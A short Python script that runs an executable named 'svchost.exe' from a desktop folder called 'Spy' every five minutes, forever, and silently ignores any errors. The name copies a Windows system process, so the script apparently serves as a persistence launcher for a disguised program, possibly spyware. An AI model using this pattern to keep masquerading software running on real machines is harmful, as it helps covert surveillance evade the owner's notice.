import os
import time
from datetime import datetime

EXE_PATH = r"c:\Users\Keer\Desktop\Spy\svchost.exe"

while True:
    try:
        if os.path.exists(EXE_PATH):
            os.system(f'"{EXE_PATH}"')
    except Exception as e:
        pass
    time.sleep(300)
